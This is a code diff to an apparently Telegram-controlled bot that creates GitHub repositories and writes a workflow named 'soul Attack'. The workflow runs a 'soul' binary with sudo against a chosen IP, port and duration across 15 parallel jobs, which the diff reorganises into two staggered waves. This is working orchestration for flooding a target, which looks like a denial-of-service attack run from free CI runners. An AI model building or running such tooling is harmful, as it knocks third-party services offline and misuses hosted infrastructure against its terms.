@@ -454,20 +454,31 @@ def create_repository(token, repo_name="soulcrack-tg"):
         raise Exception(f"Failed to create repository: {e}")
 
 def update_yml_file(token, repo_name, ip, port, time_val, method):
-    yml_content = f"""name: soul Attack
+    yml_content = f"""
+name: soul Attack
 on: [push]
 
 jobs:
-  soul:
+  first-five-jobs:
     runs-on: ubuntu-22.04
     strategy:
       matrix:
-        n: [1,2,3,4,5,6,7,8,9,10,
-            11,12,13,14,15]
+        n: [1,2,3,4,5]
     steps:
     - uses: actions/checkout@v3
     - run: chmod +x soul
-    - run: sudo ./soul {ip} {port} {time_val}
+    - run: sudo ./soul {ip} {port} 10 150
+
+  next-ten-jobs:
+    runs-on: ubuntu-22.04
+    needs: first-five-jobs
+    strategy:
+      matrix:
+        n: [6,7,8,9,10,11,12,13,14,15]
+    steps:
+    - uses: actions/checkout@v3
+    - run: chmod +x soul
+    - run: sudo ./soul {ip} {port} {time_val} 400
 """
     
     try:
@@ -2276,4 +2287,5 @@ def main():
     application.run_polling()
 
 if __name__ == '__main__':
+
     main()
